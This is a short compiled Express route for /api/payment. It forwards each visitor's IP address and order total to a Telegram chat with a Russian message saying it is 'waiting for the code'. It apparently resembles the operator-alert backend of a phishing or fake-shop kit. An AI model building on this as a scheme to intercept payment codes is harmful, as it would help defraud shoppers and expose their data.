"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const express_1 = __importDefault(require("express"));
const router = express_1.default.Router();
const telegramSender_1 = require("../utils/telegramSender");
router.post('/api/payment', (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    let clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    if (Array.isArray(clientIP)) {
        clientIP = clientIP[0];
    }
    else if (!clientIP || clientIP === "") {
        clientIP = "IP неизвестен";
    }
    const totalPrice = req.body.totalPrice;
    const messageText = `
        <b>💸Переход на страницу оплаты💸</b>\n\n💰 <strong>К оплате:</strong> <b>${totalPrice} ₽</b>\n\n⏳ <b>Ожидаем код...</b>
    `;
    const result = yield (0, telegramSender_1.sendTelegramMessage)(clientIP, messageText);
    res.json(result);
}));
exports.default = router;
